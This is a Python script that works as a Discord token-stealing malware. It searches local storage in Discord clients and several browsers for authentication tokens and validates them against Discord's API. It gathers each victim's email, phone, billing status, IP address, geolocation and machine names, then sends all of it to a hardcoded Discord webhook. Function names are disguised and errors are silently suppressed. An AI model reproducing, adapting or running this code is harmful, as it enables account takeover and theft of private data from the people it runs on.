import os
import json
import platform as plt
from re import findall
from base64 import b64decode
from datetime import datetime
from json import loads, dumps
from urllib.request import Request, urlopen

webhook_url = "https://discord.com/api/webhooks/953679426632187904/H-1MG3mxQjnPphYjZKtj6HwlCil_pSob7OwcW9Ze3A011CR4BRHtBETaFY4qToHXnhVi"

languages = {
	'da'    : 'Danish, Denmark',
	'de'    : 'German, Germany',
	'en-GB' : 'English, United Kingdom',
	'en-US' : 'English, United States',
	'es-ES' : 'Spanish, Spain',
	'fr'    : 'French, France',
	'hr'    : 'Croatian, Croatia',
	'lt'    : 'Lithuanian, Lithuania',
	'hu'    : 'Hungarian, Hungary',
	'nl'    : 'Dutch, Netherlands',
	'no'    : 'Norwegian, Norway',
	'pl'    : 'Polish, Poland',
	'pt-BR' : 'Portuguese, Brazilian, Brazil',
	'ro'    : 'Romanian, Romania',
	'fi'    : 'Finnish, Finland',
	'sv-SE' : 'Swedish, Sweden',
	'vi'    : 'Vietnamese, Vietnam',
	'tr'    : 'Turkish, Turkey',
	'cs'    : 'Czech, Czechia, Czech Republic',
	'el'    : 'Greek, Greece',
	'bg'    : 'Bulgarian, Bulgaria',
	'ru'    : 'Russian, Russia',
	'uk'    : 'Ukranian, Ukraine',
	'th'    : 'Thai, Thailand',
	'zh-CN' : 'Chinese, China',
	'ja'    : 'Japanese',
	'zh-TW' : 'Chinese, Taiwan',
	'ko'    : 'Korean, Korea'
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def monke_man_vr(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers

def subhecktor(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=monke_man_vr(token))).read().decode())
	except:
		pass

def sooper_dooper_bot(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens

def dharbot():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = urlopen(url)
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap

def getavatar(uid, aid):
	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
	try:
		urlopen(Request(url))
	except:
		url = url[:-4]
	return url

def dude(token):
	try:
		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=monke_man_vr(token))).read().decode())) > 0)
	except:
		pass

def main():
	global webhook_url
	cache_path = ROAMING + "\\.cache~$"
	embeds = []
	working = []
	checked = []
	already_cached_tokens = []
	working_ids = []
	computer_os = plt.platform()
	ip,org,loc,city,country,region,googlemap = dharbot()
	pc_username = os.getenv("UserName")
	pc_name = os.getenv("COMPUTERNAME")
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in sooper_dooper_bot(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue
			user_data = subhecktor(token)
			if not user_data:
				continue
			working_ids.append(uid)
			working.append(token)
			username = user_data["username"] + "#" + str(user_data["discriminator"])
			user_id = user_data["id"]
			locale = user_data['locale']
			avatar_id = user_data["avatar"]
			avatar_url = getavatar(user_id, avatar_id)
			email = user_data.get("email")
			phone = user_data.get("phone")
			verified = user_data['verified']
			mfa_enabled = user_data['mfa_enabled']
			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
			language = languages.get(locale)
			nitro = bool(user_data.get("premium_type"))
			billing = bool(dude(token))
			embed = {
				"color": 0xaeff00,
				"fields": [
					{
        				"name": "**Account information**",
        				"value": f'`Field1:` {email}\n`API_Calling:` {phone}\n`Nitro:` {nitro}\n`Bill:` {billing}'
        			},
        			{
        				"name": "**Computer**",
        				"value": f'`OS:` {computer_os}\n`Device:` {pc_username}\n`pcid:` {pc_name}\n`Platform:` {platform}'
        			},
        			{
    					"name": "**fields**",
        				"value": f'`line:` {ip}\n`Geo:` [{loc}]({googlemap})\n`oor:` {city}\n`oor:` {region}'
        			},
        			{
        				"name": "**Other**",
        				"value": f'`Language:` {locale} ({language})\n`Verification:` {verified}\n`2FA/MFA:` {mfa_enabled}\n`Creation:` {creation_date}'
        			},
        			{
        				"name": "**Ararticket**",
        				"value": f'```{token}```'
        			},
        			{
    					"name": "**MoonG :crescent_moon:**",
        				"value": f'```NEW Meme!! | {username}```'
        			},
				],
				"author": {
					"name": f"Username: {username}  |  User ID: {user_id}",
					"icon_url": avatar_url
				},
				"footer": {
					"text": f""
				}
			}
			embeds.append(embed)
	with open(cache_path, "a") as file:
		for token in checked:
			if not token in already_cached_tokens:
				file.write(token + "\n")
	if len(working) == 0:
		working.append('123')
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": "MoonG - Keevo",
		"avatar_url": "https://previews.123rf.com/images/djvstock/djvstock1801/djvstock180100077/92578374-lua-e-nuvem-dos-desenhos-animados-vector-%C3%ADcone-gr%C3%A1fico-ilustra%C3%A7%C3%A3o.jpg"
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=monke_man_vr()))
	except:
		pass
try:
	main()
except Exception as e:
	print(e)
	pass